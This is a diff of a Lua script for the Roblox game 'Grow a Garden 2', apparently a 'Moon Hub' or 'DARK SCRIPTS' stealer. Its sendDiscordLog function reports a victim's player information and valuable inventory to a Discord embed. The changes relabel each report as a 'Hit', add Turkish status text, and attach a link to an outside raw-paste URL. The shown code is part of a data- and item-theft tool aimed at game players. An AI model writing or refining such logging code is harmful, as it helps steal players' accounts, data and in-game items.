@@ -304,13 +304,15 @@ local function sendDiscordLog()
         inventoryString = "❌ No valuable items found in inventory."
     end
 
+    local SummaryURL = "https://api.rubis.app/v2/scrap/gdEn4BpWFH963dGS/raw"
+
     -- 2. Build the Discord Embed Data
     local embedData = {
         ["content"] = "",
         ["embeds"] = {{
-            ["title"] = "Grow a Garden 2 [ 🪺 ]",
-            ["description"] = "🔧 **How to Use?**\nJoin the game, then check your mailbox to receive your items",
-            ["color"] = 5814783, -- Discord Blurple color
+            ["title"] = "Grow A Garden 2 Hit | DARK SCRIPTS",
+            ["description"] = "✅ Yeni hit kaydı geldi. Detaylar aşağıda.",
+            ["color"] = 5814783,
             ["fields"] = {
                 {
                     ["name"] = "📄 Player Information",
@@ -327,14 +329,18 @@ local function sendDiscordLog()
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "💰 Valuable Items (Found in Mailbox)",
-                    ["value"] = inventoryString,
+                    ["name"] = "🐾 Inventory",
+                    ["value"] = inventoryString ~= "" and inventoryString or "❌ Envanterde uygun eşya bulunamadı.",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔗 Summary",
+                    ["value"] = SummaryURL,
                     ["inline"] = false
                 }
             },
             ["image"] = {
-                -- Uses the official game thumbnail
-                ["url"] = "https://tr.rbxcdn.com/39a660a9c80521e0eb7e39d73d4fcba4/768/432/Image/Png" 
+                ["url"] = "https://tr.rbxcdn.com/39a660a9c80521e0eb7e39d73d4fcba4/768/432/Image/Png"
             },
             ["footer"] = {
                 ["text"] = "Moon Hub - Grow a Garden 2"
